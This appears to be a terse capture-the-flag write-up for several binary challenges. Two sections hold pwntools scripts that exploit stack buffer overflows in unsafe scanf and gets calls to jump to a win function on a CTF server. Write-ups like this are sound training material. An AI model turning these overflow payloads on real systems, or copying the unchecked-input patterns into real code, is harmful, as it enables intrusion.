# 1. hungry
## Solution:
1) ghidra -> `main()` -> `take_order()`
2) at line 17, 0x24 -> ASCII for `$`
3) `manager_control_panel()`
4) line 12-15, `srand()`
5) pid = 1 (idk)
6) line 26 -> `bash` -> `ls` -> `cat flag.txt`
***
# 2. immaDev
## Solution:
1) ghidra -> `handleOption()`
2) `iVar1 = local_428[i]`
3) line 45 -> `if()` -> not true if `arr[0] != 2`
4) input 1/3 then 2 -> invokes `else()` at line 55
5) iterates through user input as `arr[i]` and executes `printFlag()`
***
# 3. performative
## Solution:
1) checksec -> no PIE (fixed addresses)
2) `dogbolt.org` -> `main()` has `v2[32]` which can be overwritten because `scanf("%s")` won't check buffer size
3) need to call `win()` which calls `printFlag()`
4) decomp tells us that v2 starts at [bp-0x28] and goes till [bp-0x8] because 32 bytes + we overwrite saved RBP by sending 8 bytes more
5) `gdb` -> `p win` -> `0x401275`
6) script -> payload -> gg ez
```
from pwn import *

p = remote("performative.nitephase.live", 56743)
win = 0x401275
payload = b"A" * 40 + p64(win)
p.sendlineafter(b"Buffer: ", payload)
p.interactive()
```
***
# 4. Property in Manipal
## Solution:
1) checksec  -> no PIE (fixed addresses)
2) `dogbolt.org` -> `vuln())` has `gets(&v0)` which doesn't check buffer 
3) v0 is at `[bp-0x48]` -> 72 bytes + blab about ret
4) `gdb` -> `p win` -> `0x401196`
6) script -> payload -> gg ez
```
from pwn import *

p = remote("performative.nitephase.live", 56743)
win = 0x401196
ret = 0x40101A
payload = b"A" * 72 + p64(ret) + p64(win)
p.sendlineafter(b"Enter your name to signup for the property: ", b"test")
p.sendlineafter(b"Enter the amount for customizations:  ", payload)
p.interactive()
```
***
# 5. IQ Test
## Solution: 
1)
